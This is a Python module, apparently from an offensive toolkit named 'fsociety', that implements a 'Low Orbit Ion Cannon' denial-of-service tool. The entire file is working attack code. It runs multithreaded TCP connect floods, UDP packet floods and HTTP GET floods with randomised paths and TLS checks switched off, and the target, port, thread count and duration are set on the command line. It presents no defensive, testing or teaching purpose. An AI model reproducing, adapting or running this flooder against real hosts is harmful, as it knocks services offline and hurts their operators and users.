from __future__ import annotations
import http.client
import os
import random
import socket
import string
import threading
import time
import urllib.parse
from fsociety.core.base import tool
from fsociety.core.logger import Log

@tool("loic", "Low Orbit Ion Cannon: TCP/UDP/HTTP volumetric flooder", category="dos")
class Loic:
    @staticmethod
    def build_parser(p):
        p.add_argument("target", help="Target URL or IP")
        p.add_argument("--mode", default="tcp", choices=["tcp", "udp", "http"])
        p.add_argument("--port", type=int, default=80, help="Target port")
        p.add_argument("--threads", type=int, default=100, help="Number of threads")
        p.add_argument("--duration", type=int, default=60, help="Duration in seconds")
        p.add_argument("--size", type=int, default=4096, help="Packet size (UDP)")

    @staticmethod
    def _generate_random_string(length: int) -> bytes:
        chars = string.ascii_letters + string.digits
        return "".join(random.choice(chars) for _ in range(length)).encode()

    @staticmethod
    def _resolve(target: str) -> str:
        if "://" in target: target = urllib.parse.urlparse(target).hostname or target
        try: return socket.gethostbyname(target)
        except socket.gaierror: return target

    @staticmethod
    def _tcp_flood(host: str, port: int, stop_event: threading.Event):
        while not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(2); s.connect((host, port))
                s.sendall(Loic._generate_random_string(1024)); s.close()
            except Exception: pass

    @staticmethod
    def _udp_flood(host: str, port: int, size: int, stop_event: threading.Event):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = Loic._generate_random_string(size)
        while not stop_event.is_set():
            try: s.sendto(payload, (host, port))
            except Exception: pass
        s.close()

    @staticmethod
    def _http_flood(host: str, port: int, stop_event: threading.Event):
        is_ssl = port == 443
        while not stop_event.is_set():
            try:
                if is_ssl:
                    import ssl
                    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                    conn = http.client.HTTPSConnection(host, port, timeout=3, context=ctx)
                else: conn = http.client.HTTPConnection(host, port, timeout=3)
                
                path = "/?" + Loic._generate_random_string(8).decode()
                headers = {"User-Agent": "Mozilla/5.0", "Accept": "*/*", "Connection": "keep-alive"}
                conn.request("GET", path, headers=headers); conn.getresponse().read(1024); conn.close()
            except Exception: pass

    @staticmethod
    def run(args, log: Log) -> int:
        target_host = Loic._resolve(args.target)
        log.info(f"Target: {target_host}:{args.port} | Mode: {args.mode.upper()} | Threads: {args.threads} | Duration: {args.duration}s")
        
        stop_event = threading.Event(); threads = []
        def worker():
            if args.mode == "tcp": Loic._tcp_flood(target_host, args.port, stop_event)
            elif args.mode == "udp": Loic._udp_flood(target_host, args.port, args.size, stop_event)
            elif args.mode == "http": Loic._http_flood(target_host, args.port, stop_event)

        log.warn("Firing in 3 seconds..."); time.sleep(3)
        for _ in range(args.threads):
            t = threading.Thread(target=worker, daemon=True); t.start(); threads.append(t)

        start_time = time.time()
        try:
            while time.time() - start_time < args.duration: time.sleep(1)
        except KeyboardInterrupt: log.warn("Interrupted by user.")

        stop_event.set()
        for t in threads: t.join(timeout=1.0)
        log.ok("LOIC flood stopped.")
        return 0
